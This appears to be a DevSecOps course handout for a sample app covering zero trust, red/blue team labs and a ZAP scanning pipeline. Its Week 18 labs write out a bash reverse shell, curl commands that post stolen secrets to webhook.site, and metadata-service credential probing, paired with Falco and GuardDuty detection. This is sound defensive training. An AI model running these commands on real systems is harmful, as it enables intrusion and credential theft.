Allowed frontend → auth calls correctly	
Verified logs for success/failure states	
Documented policy changes in Git (bonus)	
📦 Bonus
Deploy a new versioned service (e.g. search:v2) in staging
Then allow dev backend to only talk to search:v2 via service alias

ECS: use discoveryName: search-v2

K8s: use label-based selector + DNS override

# 🔐 Week 17 – Security: Zero Trust in ECS + Kubernetes

---

## 🎯 Why This Matters

Zero Trust security challenges the old model of “trusted internal networks” by assuming **everything is compromised** — including workloads inside your VPC or cluster.

In DevSecOps, this means:

- Enforcing **identity at every layer**
- Allowing only explicitly permitted traffic
- Treating every request as potentially malicious — even internally
- Monitoring and logging everything for traceability

---

## 🔍 Core Zero Trust Principles

| Principle | DevSecOps Implementation |
|----------|--------------------------|
| **Never trust, always verify** | mTLS, IAM role checks, DNS identity validation |
| **Least privilege** | Per-service IAM roles, namespace secrets, RBAC |
| **Explicit access only** | NetworkPolicies, deny-all by default |
| **Assume breach** | Logging, anomaly detection, minimal attack surface |
| **Microsegmentation** | Namespaces, service-specific identity, isolated DNS routing |

---

## 🧠 Identity-Driven Access in ECS

- **IAM Roles for Tasks**: Each ECS service has its own IAM role.
- **Service Connect**: Every request is routed through a proxy that can enforce **namespace isolation** and **client aliasing**.
- **DNS Routing**: Controls which services are discoverable via `*.notesapp.local`.

✅ This builds a verifiable identity chain for every request.

---

## 🧠 Identity-Driven Access in Kubernetes

- **Service Accounts**: Each workload has its own K8s identity.
- **RBAC**: Fine-grained permissions to configmaps, secrets, APIs.
- **NetworkPolicies**: Restrict traffic based on pod labels and namespaces.
- **Mutual TLS** (optional via Istio/Linkerd): Enforces identity at transport layer.

✅ Zero Trust is enforced at **network**, **API**, and **identity** layers.

---

## 🔐 Risks You’re Mitigating

| Risk | Example | Zero Trust Control |
|------|---------|--------------------|
| Lateral movement | One service compromised, others infected | NetworkPolicies, IAM isolation |
| Secrets sprawl | One container reads all secrets | Scoped secret access (Vault/K8s) |
| Misrouted traffic | Dev service calls staging/production | Namespace isolation, IAM discovery limits |
| Impersonation | No service identity, all share one token | Per-service IAM/SA with short-lived credentials |
| Over-privilege | Services can access unused APIs | Least privilege via roles and deny-by-default |

---

## 🧠 Threat Modeling View

| Attack | Impact | Zero Trust Response |
|--------|--------|---------------------|
| Compromised backend queries itself to extract internal data | Full access to internal methods | Deny self-calls via policies |
| Dev frontend queries staging secrets | Cross-env leak | Isolate namespaces + block IAM discovery |
| Rogue staging service calls prod | Potential data exfiltration | Explicit namespace trust boundaries |

---

## 🛠 Key Enforcement Techniques

| Platform | Enforcement | Notes |
|----------|-------------|-------|
| ECS | IAM roles, Service Connect, DNS isolation | Identity-aware service-to-service access |
| Kubernetes | NetworkPolicies, Service Accounts, RBAC | Pod-level control over ingress/egress |
| Optional Add-ons | Istio, Linkerd, SPIRE | Stronger identity and transport-level control |

---

## 📊 Visibility & Monitoring

Zero Trust is only effective if visibility exists:

- **ECS VPC Flow Logs + CloudWatch Logs**
- **Kubernetes Audit Logs + Prometheus Metrics**
- **OpenTelemetry tracing for service-to-service calls**
- **GuardDuty for anomalous traffic**
- **Falco for unexpected process activity**

> 🎯 Observability is part of the Zero Trust loop: **authenticate ➝ authorize ➝ audit.**

---

## 📘 DevSecOps Mindset Shift

| Old Model | Zero Trust Model |
|-----------|------------------|
| Flat network = trusted | Every boundary must be earned and validated |
| Secrets shared across services | Each workload gets scoped identity and credentials |
| Manual allow lists | Policy-as-code governs traffic and access dynamically |
| Trust by subnet | Trust by identity, enforced by proxy and IAM |

---

## 🏁 What You’ve Gained

You can now:

✅ Enforce service isolation in ECS and Kubernetes  
✅ Apply least privilege access to IAM roles and service accounts  
✅ Implement namespace boundaries to prevent cross-env access  
✅ Monitor and debug misrouted or unauthorized service calls  
✅ Align workload infrastructure with **Zero Trust best practices**

---

## 🧱 App Evolution Summary

| Layer | Upgrade |
|-------|---------|
| 🧠 Identity | IAM Roles for ECS, Service Accounts for K8s |
| 🌐 Traffic | Service Connect & K8s NetworkPolicies |
| 🔒 Secrets | Environment-scoped + identity-scoped access |
| 🧪 Test Cases | Cross-env traffic, self-call prevention, isolation verified |
| 📦 Version Routing | dev → staging:search:v2 (selectively allowed) |

# 🔁 Week 17 – Reflection: Zero Trust in ECS + Kubernetes

---

## 🔍 What You Implemented

This week was about shifting from **network-centric** trust models to **identity- and policy-driven** controls:

✅ You enforced **per-environment isolation** via namespaces in both ECS and Kubernetes  
✅ You ensured services **could only communicate** based on defined identity and traffic policy  
✅ You scoped **IAM roles and service accounts** tightly around least privilege  
✅ You learned to use **NetworkPolicies**, **Service Connect**, and **RBAC** as policy enforcement points  
✅ You simulated and remediated **Zero Trust violations** (e.g. dev → staging, self-calls)

---

## 💡 What You Learned

| Area | Key Insights |
|------|--------------|
| **Zero Trust Philosophy** | "Never trust, always verify" applies at service, network, and identity layers |
| **Workload Identity** | Assigning IAM roles (ECS) or service accounts (K8s) limits blast radius and enables auditing |
| **Least Privilege** | Each service should get *only* the permissions and communication paths it needs |
| **Policy-as-Code** | Your policies — IAM, NetworkPolicies — are versioned, testable, and enforceable at deploy time |
| **Debugging** | Real-world teams will often mislabel, misroute, or over-permit — and you'll now spot those patterns fast |

---

## 📦 App Evolution

| Component | Evolution |
|----------|-----------|
| **Auth / Notes / Search services** | Now run under **isolated service identities** |
| **Frontend** | Can only access permitted backend services; cross-env blocked |
| **Backend** | Denied from self-calling and cannot escalate access to other services |
| **Service-to-Service Routing** | Version-aware (e.g., dev calling `search:v2` in staging only if explicitly allowed) |
| **Secrets** | Access based on service identity, not shared by environment |

---

By completing this week, you now have experience with:

🎯 Designing Zero Trust environments  
🎯 Implementing defense-in-depth traffic policies  
🎯 Troubleshooting policy gaps in IAM and K8s

🎯 Aligning with enterprise-grade security and compliance practices

## 🛠️ Next Steps / Reinforcement

Want to deepen your knowledge?

- ✅ Use **SPIRE + SPIFFE** to auto-issue workload identities across environments
- ✅ Layer in **service mesh** (e.g., Linkerd, Istio) for automatic mTLS and policy control
- ✅ Build dashboards showing allowed vs denied traffic
- ✅ Audit IAM roles and RBAC bindings using tools like `kube-bench`, `PMapper`, or `Polaris`

---

## 📣 Final Thought

Zero Trust is **not a tool** — it’s a mindset shift. It forces you to be deliberate about every permission, every connection, and every interaction between workloads. This week elevated your architecture from "secure by design" to "**secure by default**."

# 🧨 Week 18 – Red Team vs Blue Team Scenarios

---

## 🎯 Goal

Simulate real-world attacks (Red Team) and respond using your DevSecOps observability and enforcement stack (Blue Team).

This module helps you:

- Validate the strength of your Zero Trust, RBAC, runtime security, and CI/CD hardening
- Learn how attackers move laterally, escalate, and exfiltrate
- Strengthen your incident response and policy tuning skills

---

## 🔬 Key Concepts

| Concept | Description |
|--------|-------------|
| **Red Teaming** | Simulated offensive attacks to test system defenses, detection, and response |
| **Blue Teaming** | Defensive monitoring, alerting, and threat mitigation |
| **MITRE ATT&CK Framework** | Standardized taxonomy of adversary behavior used to model scenarios |
| **Defense-in-Depth** | Layering detection + enforcement (IAM, RBAC, runtime, logging, alerting) |
| **Incident Response** | Detect → Investigate → Contain → Eradicate → Recover → Report |

---

## 🔐 Security Context

This week, you’re not just building; you’re **breaking and defending**:

- What happens if a container escapes?
- Can one microservice snoop another's secrets?
- Do your logs actually catch strange activity?
- Does your alerting respond fast enough?
- Are you exposing things via environment variables or unscanned images?

---

## 🧱 App Evolution

The NoteStream Pro app will be tested under real-world attack paths:

- **Malicious actor inside a container**
- **Escalated privilege via overly permissive IAM**
- **Compromised CI/CD pipeline leaking credentials**
- **Recon and lateral movement inside the cluster or VPC**
- **Data exfiltration attempts**

We’ll simulate these in both ECS and Kubernetes environments.

---

## 🔧 Tools & Techniques You’ll Use

| Tool | Purpose |
|------|---------|
| **Falco** | Runtime detection (K8s & ECS EC2) |
| **CloudTrail / GuardDuty** | Detect cloud-side anomalies |
| **KubeAudit / Prowler** | Audit Kubernetes and AWS misconfigurations |
| **AWS Detective** | Trace attack paths through IAM, networking |
| **Netcat / Curl / Reverse Shells** | Simulate malicious behavior |
| **Tmate / SSH** | Limited attack simulation access for testing |
| **Simulated compromised tokens** | CI/CD pipeline infiltration |

---

## 🛡️ What You’ll Build and Test

- ✅ Runtime threat detection
- ✅ CI/CD pipeline hardening verification
- ✅ Secrets leak testing and scanning
- ✅ IAM and RBAC over-permission audits
- ✅ Real-time alerting and log correlation
- ✅ Lateral movement attempt detection

---

## 🧠 Why This Matters in DevSecOps

DevSecOps isn’t theoretical. You’ll face attackers, insider threats, misconfigs, and shadow IT. By proactively running your own attack simulations, you:

- Understand your actual blast radius
- Tune alerts to catch what matters
- Shift policies from “best effort” to “enforceable”
- Build **muscle memory** for incidents

# 🧨 Week 18 – Guided Lab: Simulated Attack Chain & Blue Team Defense

---

## 🧪 Lab Scenario Overview

You are the DevSecOps engineer for NoteStream Pro. You receive an alert from GuardDuty and Falco suggesting suspicious activity in your `backend` service.

In this lab, you'll:
1. Simulate a compromise (Red Team)
2. Investigate with logs, tracing, and audit tools (Blue Team)
3. Apply remediations (DevSecOps)

---

## 🗺️ Attack Chain Summary

| Step | Action | Tool | Target |
|------|--------|------|--------|
| 1 | Exploit vulnerable backend API | curl/Burp | ECS/K8s backend |
| 2 | Reverse shell into container | netcat | backend task/pod |
| 3 | Lateral movement | curl, environment vars | internal service |
| 4 | Exfiltrate secret | curl, base64 | external URL |
| 5 | Trigger alerts and analyze logs | GuardDuty, CloudTrail, Falco | Cloud & runtime logs |
| 6 | Patch and isolate | IAM, NetworkPolicy, image rebuild | CI/CD + infra |

---

## 🔧 Step-by-Step Red Team Attack

> ❗ Run only in your dev/test environment.

---

### ✅ 1. Trigger a Vulnerable Endpoint (Broken Auth)

Simulate a weak auth bypass in backend (e.g., missing token check):

```bash
curl -X POST http://<backend-ip>:3000/api/notes \
  -H "Content-Type: application/json" \
  -d '{"title":"Injected Note","content":"Pwned"}'
🧪 Confirm: Note created without auth.

✅ 2. Simulate Container Compromise (Reverse Shell)
Start a listener on your laptop:

nc -lvnp 4444
Then from within the container (simulate via kubectl exec or ECS exec):

bash -i >& /dev/tcp/<your-ip>/4444 0>&1
You now have a shell.

🧪 Confirm: You can cat /etc/passwd or env inside container.

✅ 3. Lateral Movement via ENV Secrets
Check if secrets are exposed in env:

env | grep -i secret
Attempt call to staging or auth service:

curl http://auth.staging.svc.cluster.local:3000/admin
🧪 If succeeds — Zero Trust is broken.

✅ 4. Simulate Data Exfiltration
Try sending secrets to an external domain:

curl -X POST https://webhook.site/<your-url> \
  -d "stolen=$(cat /var/secrets/api-key)"
🧪 Confirm: You received the post on webhook.site.

🛡️ Step-by-Step Blue Team Response
🔍 5. Detect Activity
In ECS:

Check CloudTrail for ExecuteCommand, suspicious IAM usage

Check GuardDuty for ReverseShell, CryptoMiner, PortSweep

aws guardduty get-findings --detector-id <id> --query 'findings[?severity>=7]'
In Kubernetes (Falco + Auditd):

Look for these rules:

- rule: Unexpected Network Connection
  output: "Outbound connection detected: %proc.name -> %fd.name"
🔥 Falco alert triggered? Good.

Check audit log:

kubectl logs -n falco falco-pod
🧰 6. Mitigation & Hardening
Issue	Fix
Broken auth	Add JWT middleware, test in CI
Reverse shell	Disallow outbound traffic via iptables or Falco
ENV secrets	Move secrets to mounted volume, not env
Exfil attempt	Block 0.0.0.0/0 egress, use NetworkPolicy
No detection	Add more Falco rules, set up Slack/webhook alerts
IAM overpermission	Use IAM Access Analyzer + least privilege policy tool
✅ What You Should Observe
Artifact	Signal
guardduty-findings.json	Reverse shell, suspicious network activity
falco.log	Outbound shell, unexpected process
cloudtrail.log	API abuse, suspicious activity
otel-trace	Request flow: frontend → backend → staging (bad)
audit.log	Unauthorized file access
📦 Output Checklist
✅	Item
Simulated a full attack chain	
Verified successful detection	
Captured logs and alerts	
Documented what was fixed	
Hardened IAM, network, and runtime	
Updated CI to scan for auth failures	
Bonus: Playbook of incident steps	
🧠 Real-World Tip
In real environments, the attacker won’t stop at env. They'll:

Look for mounted AWS credentials (~/.aws)

Use metadata services (169.254.169.254)

Try curl to exposed dashboards

Pivot to workloads with higher privilege

This lab trains you to think and act before they do.

# 🧨 Week 18 – Guided Lab: Simulated Attack Chain & Blue Team Defense

---

## 🎯 Scenario

An alert from Falco flags a suspicious outbound connection from the `notes-backend` container.  
You’ll simulate an attack (Red Team) and trace, defend, and patch it (Blue Team).

---

## 🧪 Red Team Phase (Simulated Attack)

### 🛠️ Step 1: Exploit Weak Authentication (OWASP A2: Broken Auth)

```bash
# Attempt to POST a note without an Authorization header
curl -X POST http://<BACKEND_URL>:3000/api/notes \
     -H "Content-Type: application/json" \
     -d '{"title": "Hacked", "content": "This was injected"}'
🔍 Command Breakdown:
-X POST: Specifies HTTP POST method

-H: Sets a custom request header

-d: Sends raw JSON data as request body

✅ Expected:
Backend accepts request without validating JWT → broken authentication

🧠 DevSecOps Tie-In:
CI pipeline should include automated API security tests

Authorization should be enforced in middleware, tested at build

🛠️ Step 2: Simulate Container Access (via ECS Exec or kubectl exec)
# ECS example: Connect to container
aws ecs execute-command \
    --cluster notes-dev \
    --task <task-id> \
    --container notes-backend \
    --command "/bin/sh" \
    --interactive
🔍 Command Breakdown:
--cluster: Name of ECS cluster

--task: Target task ID

--container: Container to connect to

--command: Shell to run

--interactive: Keeps session open

📌 Or use kubectl exec -it pod-name -- /bin/sh for K8s.

✅ Expected:
Shell access into container

🧠 Real-World Risk:
Compromised container = attacker beachhead

If IAM roles or secrets are over-permissive → lateral movement possible

🛠️ Step 3: Extract Environment Variables
# Look for secrets in environment variables
env | grep -i token
🔍 Explanation:
env: Lists all environment variables

grep -i: Case-insensitive search for word “token”

✅ Expected:
Tokens, DB URIs, API keys appear in plain text

🧠 DevSecOps Fix:
Replace env-based secrets with mount-based secrets from Vault, AWS Secrets Manager, or Kubernetes secrets

🛠️ Step 4: Try Lateral Movement
# Attempt to access a sibling service in staging namespace
curl http://search.staging.local:3000/health
🔍 Explanation:
Targets internal service via DNS

Tests if cross-env isolation is broken

🧠 Policy Fix:
ECS: Use Service Connect namespaces and deny dev → staging calls

K8s: Apply NetworkPolicies to isolate services per namespace

🛠️ Step 5: Simulate Data Exfiltration
# Simulate exfiltrating a secret using curl
curl -X POST https://webhook.site/your-id \
     -d "leaked_token=$(cat /secrets/api-key)"
🔍 Explanation:
-X POST: Send HTTP POST

-d: Include file contents as request payload

✅ Expected:
Secret posted to external server

🧠 DevSecOps Control:
Runtime detection (Falco, eBPF)

Egress control via iptables, NetworkPolicy, or ECS security group

🛡️ Blue Team Phase (Defense)
🔎 Step 6: Detect with Falco
Falco rule catches reverse shell or netcat call:

# ECS EC2 or Kubernetes log
kubectl logs falco-pod -n falco | grep "Outbound connection"
✅ Expected:
Log line with "Outbound connection detected"

🧠 Why It Matters:
Falco watches for syscall patterns that indicate abnormal behavior (e.g., bash, nc, unexpected DNS)

🔎 Step 7: Detect with GuardDuty
# List findings with severity > 7
aws guardduty get-findings \
    --detector-id <id> \
    --query "findings[?severity>=7]"
🔍 Explanation:
--detector-id: ID of GuardDuty instance

--query: Filters results with JMESPath

✅ Expected:
Findings for UnauthorizedAccess, Recon, or Exfiltration

🔎 Step 8: Audit CloudTrail & IAM Misuse
# List recent API calls
aws cloudtrail lookup-events \
    --lookup-attributes AttributeKey=Username,AttributeValue=<compromised-role> \
    --max-results 10
🔐 Step 9: Apply Fixes & Hardening
Issue	Fix
Weak auth	Add JWT middleware + automated tests
Secrets in env	Migrate to secret manager or Vault
No egress restriction	Add NetworkPolicy (K8s) or Service Connect (ECS) +
scoped SGs	
IAM too permissive	Refactor with IAM Access Analyzer
No alerting	Integrate Falco and GuardDuty into Slack/SIEM
Insecure container	Rebuild with non-root user, read-only FS, DROP CAP_SYS_ADMIN
🧠 MITRE Mapping
Tactic	Technique	Simulation Step
Initial Access	T1190 – Exploit Public-Facing App	Step 1
Execution	T1059 – Command and Scripting Interpreter	Step 2
Credential Access	T1552 – Unprotected Secrets	Step 3
Lateral Movement	T1021 – Remote Services	Step 4
Exfiltration	T1041 – Exfil via Command & Control	Step 5
Defense Evasion	T1562 – Disable/Bypass Security Tools	(Optional)
✅ Completion Checklist
✅	Task
Simulated weak auth attack	
Gained shell access to container	
Dumped env secrets	
Accessed sibling service	
Exfiltrated data externally	
Detected attack via Falco & GuardDuty	
Applied hardening measures	
Mapped scenario to MITRE ATT&CK	
Wrote or extended your own Falco rule (optional)	
📦 Output Artifacts
falco-alert.log

cloudtrail-events.json

guardduty-findings.json

exfil-test.webhook.txt

post-mitigation-checklist.md

This lab is a turning point: You didn’t just build a secure pipeline — you challenged it like an attacker, then patched it like a DevSecOps lead. 💥

# 🎯 Week 18 – Challenge Lab: Design Your Own Red/Blue Attack Scenario

---

## 🧪 Challenge Goal

Simulate a **complete attack chain** on your evolving NoteStream Pro stack — from initial access to exfiltration — then **detect, respond, and harden** the system using tools we’ve deployed in earlier weeks.

You will:
- Create your own attack path (based on OWASP or MITRE ATT&CK)
- Execute the attack in dev/staging
- Collect real evidence (logs, alerts, IAM trails)
- Respond and document the defensive controls applied

---

## 🔧 Step 1: Design Your Attack Scenario

Choose an entry point and build a threat narrative. Some options:

| Entry Vector | Simulation Idea |
|--------------|-----------------|
| Unprotected API | Forge a POST without auth |
| Vulnerable image | Use `curl` to pull from malicious container registry |
| Misconfigured IAM | Abuse over-permissive role to list buckets |
| Lateral movement | Access sibling service in a different namespace |
| Public S3 bucket | Upload exfiltrated data to open bucket |
| Exposed metadata service | Use `curl 169.254.169.254` to extract credentials |

Use this template:

```md
## Threat Narrative:
Attacker discovers unauthenticated endpoint in the backend. Uses it to inject a note. From there, reverse shells into container, extracts AWS credentials from metadata service, and uploads secrets to external endpoint.
🛠️ Step 2: Execute the Attack
Document and execute each step using detailed commands, including:

curl with full flag annotations

aws CLI for IAM/service abuse

netcat, bash, or kubectl exec for shell access

kubectl, ecs execute-command for container access

Use Burp if desired to fuzz APIs or simulate form injection

💡 Record each command with:

What it does

What you're observing

How the system reacts (or fails to react)

🔍 Step 3: Detect
Use the following tools to catch the intrusion:

Tool	What to check
Falco	Logs showing outbound calls, netcat, bash
GuardDuty	Findings on reverse shells, role misuse
CloudTrail	Suspicious API calls, IAM list privileges
OTEL	Traces showing internal abuse
Loki or CloudWatch	Look for abnormal logs in backend container
🔐 Step 4: Respond & Harden
For every step of the attack, apply a security control:

Vulnerability	Hardened Fix
Exposed env secret	Move to Vault or sealed secret
Metadata exposed	Enable Instance Metadata v2 or block IMDS on task
No alerts	Add Falco rule, or enable CloudWatch alarm
Wide IAM role	Apply scoped permission set with IAM Access Analyzer
Weak ingress/egress	Apply NetworkPolicy or scoped security group
📦 Step 5: Submit the Artifacts
In your GitHub repo, create a Week18/challenge folder with:

File	Contents
attack-path.md	Written attack steps + MITRE mapping
commands.log	Full list of commands + observations
falco-alert.log	If triggered
guardduty-findings.json	If available
cloudtrail-events.json	Filtered results from IAM/API misuse
post-mitigation-checklist.md	Hardened fixes and how to test them
🧠 Bonus Missions (Optional)
🔄 Replay the same attack after patching — does it still succeed?

✏️ Write a new Falco rule to detect a missed behavior

📜 Add a GitHub Action that checks your Terraform/K8s manifests for changes that might reintroduce the vulnerability

✅ Completion Checklist
✅	Task
Created a realistic attack chain	
Executed it in controlled dev/staging env	
Captured runtime logs and alerts	
Applied at least 3 defenses	
Mapped to MITRE ATT&CK techniques	
Wrote up post-mitigation summary	
Bonus: Added Falco rule or automation	
💡 Real-World Reminder
In production, most incidents are not from elite hackers — they’re from:

Forgotten debug endpoints

Exposed metadata services

Over-permissive IAM roles

Secrets in env

This challenge makes you the engineer who can both find and fix those problems — before an attacker does.

# 🔐 Week 18 – Security Principles: Red/Blue Teaming & Incident Response

---

## 🎯 Objective

Simulating real-world attack chains isn't just about breaking things — it's about understanding **what breaks**, **why it breaks**, and how to **build in protections** across every layer of the system.

This week focuses on:
- Mapping attacks to security gaps
- Using runtime and cloud-native signals to detect threats
- Reinforcing app, infrastructure, and pipeline defenses

---

## 🧠 Core Security Concepts

| Concept | Description |
|--------|-------------|
| **Defense in Depth** | No single point of failure; you need multiple layers (IAM + secrets + runtime detection) |
| **Shift-Right Security** | Detect and respond **after** deployment with Falco, GuardDuty, CloudTrail, OTEL |
| **Incident Response** | Structured playbooks and alert channels for security teams to take action |
| **Runtime Threat Detection** | Monitor syscall behavior with Falco/eBPF to catch real-time threats |
| **MITRE ATT&CK Mapping** | Model real adversary tactics and identify which techniques you’re vulnerable to |
| **Zero Trust Enforcement** | No implicit trust between services; verify and isolate everything |
| **Security Logging & Evidence** | Store, normalize, and index all relevant logs to support forensic analysis |
| **Security Chaos Engineering** | Intentionally simulate attacks to validate your controls are working (purple teaming) |

---

## 🔐 Must-Have Defensive Controls

### 🔒 Secrets

| Area | Control |
|------|---------|
| Container | Avoid secrets in `env`, use mounted volumes or secret stores |
| Kubernetes | Use Sealed Secrets or HashiCorp Vault |
| ECS | Use `AWS Secrets Manager` with task role and KMS encryption |
| CI/CD | Never store plaintext secrets; use secret scopes, OIDC or vault integrations |

---

### 🚧 Network & Egress

| Problem | Fix |
|--------|-----|
| Unrestricted egress | Add security groups or Kubernetes `NetworkPolicy` |
| Cross-namespace talk | Use ECS Service Connect namespaces or K8s isolation |
| No visibility | Monitor DNS and network calls with eBPF or VPC Flow Logs |

---

### 🔐 IAM

| Issue | Solution |
|-------|----------|
| Task or Pod has wide access | Use IAM Access Analyzer or `kubectl-who-can` |
| Tokens not rotated | Automate via Secrets Manager or Vault with TTLs |
| IAM reuse | Use short-lived federated sessions (OIDC for CodeBuild, GitHub Actions) |

---

### 🧪 Runtime + Detection

| Tool | Purpose |
|------|---------|
| Falco | Watch for reverse shells, `chmod 777`, unexpected tools like `nc`, `curl`, `wget` |
| GuardDuty | Detect port scans, crypto miners, unusual role usage |
| OTEL Traces | Identify lateral movement or malicious service-to-service behavior |
| Auditd / Sysdig / eBPF | Capture detailed syscall data for forensic replay |
| CloudTrail | Detect suspicious console or IAM/API activity |

---

## 🧰 CI/CD Security Response Steps

When a threat is detected, **CI/CD becomes the fix pipeline**:

1. **Isolate**
   - Rebuild containers from secure base images
   - Temporarily disable impacted service
2. **Patch**
   - Apply code fix (e.g. add auth, remove debug)
   - Add failing tests for the exploit path
3. **Verify**
   - Run Trivy or Grype scans for known CVEs
   - Add BurpSuite or OWASP ZAP to regression tests
4. **Redeploy**
   - Redeploy to hardened environment
5. **Retest**
   - Rerun attacker scenario in test to confirm fix
6. **Document**
   - Update README, Playbook, Falco rule set

---

## 🧠 Lessons for the Real World

| Observation | Action |
|-------------|--------|
| You were able to reverse shell into container | Add read-only filesystem, drop capabilities, block outbound |
| Secrets were visible via `env` | Move to Vault + mounted volume + rotate via CI |
| You accessed staging from dev | Enforce namespace isolation + scoped DNS resolvers |
| Falco didn’t alert | Expand ruleset or validate container runtime compatibility |
| Logs were hard to search | Centralize with Loki + alerts on keywords or behaviors |

---

## 📘 DevSecOps Culture Additions

- 🔁 Run red/blue team simulations **quarterly**
- 📜 Write and maintain **incident response playbooks**
- 🚨 Set up alerting pipelines into Slack/SIEM from Falco, GuardDuty
- 🧑‍🏫 Educate devs on common CWE/OWASP Top 10 issues during code review
- 🧪 Schedule automated **security regression tests** in CI

# 🧠 Week 18 – Reflection: Red Team vs Blue Team & Threat Resilience

---

## 📌 What You Experienced

This week was your first deep simulation of a **real adversarial attack** against your own evolving DevSecOps stack. You didn’t just scan for vulnerabilities — you **built and executed an attack chain**, detected it with real tools, and rebuilt your app and infra to survive the hit.

---

## 💡 Key Insights

### 🟥 From the Red Team

- Attack paths are often simple: unauthenticated endpoints, exposed secrets, or over-permissive IAM roles.
- Metadata services (IMDS, STS tokens) are extremely high-value targets.
- Secrets stored in `env` or hardcoded files are low-hanging fruit for attackers.
- Lateral movement is possible if service boundaries aren’t tightly enforced.

### 🟦 From the Blue Team

- Falco + GuardDuty provided early signals of compromise, but only when tuned correctly.
- CloudTrail and OTEL gave post-exploitation traceability and behavioral analysis.
- Hardened secrets management (Vault, SOPS, KMS) prevented full exfiltration.
- Applying **network policies, IAM restrictions, and runtime policies** created real barriers for lateral movement.

---

- [ ] Forensic investigation via CloudTrail, auditd, or trace logs
- [ ] Hardening IAM, network, and container profiles
- [ ] Running security drills in CI/CD (e.g., fail on secret commits or CVEs)

# 🏗️ Week 19 – Capstone Project I: Build a Secure Software Factory

---

## 🎯 Goal

Design and build a **fully integrated secure CI/CD pipeline** that takes your evolving app (NoteStream Pro) through:

- 🛠️ Secure code workflows  
- 🔐 Secrets management  
- 🐳 Container image hardening  
- 🧪 Vulnerability scanning  
- 📦 Artifact signing and SBOMs  
- 🚀 Deployment into a secured environment (ECS or K8s)

This isn't a simulation — this is your **real, production-grade pipeline**.

---

## 🧠 Core Concepts

| Concept | Explanation |
|--------|-------------|
| **Secure Software Factory** | A complete toolchain that enforces security from commit to deploy |
| **Trusted Supply Chain** | Ensure integrity and provenance of code, builds, and images |
| **Defense-in-Depth CI/CD** | Apply security at every stage: commit, build, scan, deploy, and monitor |
| **Provenance Attestation** | Use SBOMs and signing to prove artifact origin and trustworthiness |
| **Deployment Assurance** | Only signed, scanned, tested, and policy-compliant code gets deployed |

---

## 🧰 Tech Stack

| Stage | Tooling |
|-------|---------|
| Source | GitHub / GitLab |
| Build | GitHub Actions / GitLab CI / AWS CodeBuild |
| IaC | Terraform, CDK, SAM |
| Image Security | Trivy, Grype, Syft |
| Secrets | Vault, SOPS, GitHub Encrypted Secrets |
| Attestation | Sigstore (cosign), in-toto, Syft |
| Deploy | ECS Fargate + Service Connect or K8s |
| Runtime | Falco, OTEL, GuardDuty |
| Monitoring | CloudWatch / Loki / Prometheus |

---

## 🧩 Secure CI/CD Flow (Example)

```mermaid
graph TD
  A[Commit Signed Code] --> B[Pipeline Triggered]
  B --> C[Secrets Injected Securely]
  C --> D[SBOM Generated + Scan w/ Trivy]
  D --> E[Run Static + Dynamic Tests]
  E --> F[Sign Container w/ Cosign]
  F --> G[Deploy to Staging (K8s or ECS)]
  G --> H[Runtime Monitoring (Falco + OTEL)]
  G --> I[Generate Audit Trail + Compliance Report]
🔐 Security Layers (Mapped to Pipeline)
Stage	Security Control
Code	Signed commits, branch protection, SBOM
Build	CI runner isolation, secrets injection via OIDC
Test	SAST (SonarQube), DAST (ZAP), unit + API tests
Image	Minimal base image, no root, Trivy scan, Cosign sign
Deploy	CDK/Terraform IaC scan, OPA policy, IAM-scoped roles
Runtime	Falco for syscall alerts, OTEL for trace anomalies
Audit	CloudTrail/Logs + webhook alerts to Slack/SIEM
🛠️ Project Expectations
By the end of this week you will:

✅ Deploy an app using IaC + secured CI/CD

📘 DevSecOps Value

Understand how modern secure pipelines work end-to-end

Can integrate security by design, not bolted on later

Have real-world deliverables (signed images, SBOMs, pipelines) to showcase

🧠 This week isn’t about new tools — it’s about assembling everything you’ve learned into a real-world system that you can reuse, adapt, and improve professionally.

🔍 Where DAST Fits in a Secure Software Factory
Test Type	Tooling	When it's run	Purpose
✅ SAST	Bandit, SonarQube, ESLint	During build	Detect insecure code patterns statically

# 🏗️ Week 19 – Guided Lab: Secure Software Factory with OWASP ZAP DAST

---

## 🎯 Goal

Set up a **production-grade CI/CD pipeline** for NoteStream Pro that:

- Builds and scans Docker images
- Injects secrets securely
- Deploys to a staging environment
- Runs OWASP ZAP **DAST** scans against the live staging app
- Blocks or flags builds with critical vulnerabilities
- Stores **SBOMs**, logs, and scan reports

---

## 🧱 Lab Architecture

```mermaid
graph TD
  A[Git Push] --> B[GitHub Actions or GitLab CI]
  B --> C[Build Docker Image]
  C --> D[Run SCA Scan (Trivy)]
  C --> E[Generate SBOM (Syft)]
  E --> F[Sign w/ cosign]
  F --> G[Deploy to ECS/K8s Staging]
  G --> H[Run ZAP DAST Scan via CLI]
  H --> I[Upload HTML Report to CI/CD logs or S3]
  I --> J[Runtime Monitoring (Falco, GuardDuty)]
🛠️ Prerequisites
✅ CI/CD pipeline already set up (GitHub Actions or GitLab CI)

✅ App is containerized

✅ ECS Fargate or Kubernetes staging environment deployed

✅ docker build and kubectl/aws ecs available in pipeline

✅ Your NOTE_STREAM_PRO_STAGING_URL environment variable is set (e.g. https://staging.notestreampro.dev)

📦 Add ZAP to Your Pipeline
✅ Step 1: Install ZAP in CI Runner
In GitHub Actions:

- name: Install OWASP ZAP CLI
  run: |
    sudo apt update && sudo apt install -y snapd
    sudo snap install zaproxy --classic
In GitLab CI (Docker image):

image: owasp/zap2docker-stable
✅ Step 2: Run ZAP Baseline Scan
Create a ZAP scan script:

📄 .zap/zap-baseline.sh
#!/bin/bash
TARGET_URL=$1
REPORT_FILE=$2

docker run --rm -v $(pwd):/zap/wrk/:rw \
  owasp/zap2docker-stable zap-baseline.py \
  -t "$TARGET_URL" \
  -r "$REPORT_FILE" \
  -x zap-report.xml \
  -J zap-report.json \
  -m 5 \
  -T 10
✅ What it does:

-t: Target URL to scan (your staging app)

-r: HTML report output

-x/-J: Output XML/JSON results for machine parsing

-m: Max alerts per rule

-T: Timeout in minutes

✅ Step 3: Call the Script in CI
GitHub Actions
- name: ZAP Baseline DAST Scan
  run: |
    chmod +x .zap/zap-baseline.sh
    .zap/zap-baseline.sh "$NOTE_STREAM_PRO_STAGING_URL" "zap-report.html"
GitLab CI
zap_scan:
  stage: test
  image: docker:latest
  services:
    - docker:dind
  script:
    - chmod +x .zap/zap-baseline.sh
    - .zap/zap-baseline.sh "$NOTE_STREAM_PRO_STAGING_URL" "zap-report.html"
  artifacts:
    paths:
      - zap-report.html
✅ Step 4: Add Post-Scan Security Gate (Optional)
In GitHub Actions:

- name: Fail on High ZAP Alerts
  run: |
    grep -q 'High' zap-report.html && exit 1 || echo "No high severity alerts"
🛑 This breaks the build if any high-severity issues are found.

📁 Output Artifacts
